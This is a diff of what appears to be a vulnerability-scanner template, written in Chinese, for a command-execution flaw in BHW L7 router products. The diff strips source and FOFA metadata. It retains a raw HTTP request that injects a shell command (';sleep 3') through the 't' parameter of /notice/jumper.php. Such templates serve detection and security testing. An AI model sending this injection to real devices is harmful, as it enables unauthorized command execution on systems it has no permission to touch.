@@ -3,14 +3,8 @@ info:
   name: 碧海威L7多款产品jumper存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/257769b44827baa41ff961aee7d98d0f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 257769b44827baa41ff961aee7d98d0f
-    fofa: product="碧海威科技-L7云路由"
 http:
 - raw:
   - 'GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
